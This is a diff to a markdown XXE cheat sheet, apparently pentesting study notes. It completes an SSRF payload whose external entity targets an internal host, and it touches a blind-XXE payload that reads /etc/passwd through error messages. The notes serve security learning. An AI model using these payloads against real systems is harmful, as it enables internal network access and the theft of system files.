@@ -45,7 +45,9 @@
 ## <mark style="color:yellow;">Perform SSRF attacks</mark>
 
 ```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+<stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
 
 ## <mark style="color:yellow;">Blind XXE</mark>
@@ -87,7 +89,7 @@
 
 ### <mark style="color:yellow;">Via error messages</mark> <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" id="exploiting-blind-xxe-to-retrieve-data-via-error-messages"></a>
 
-Trigger an XML parsing error message with the file contents.&#x20;
+Trigger an XML parsing error message with the file contents.
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
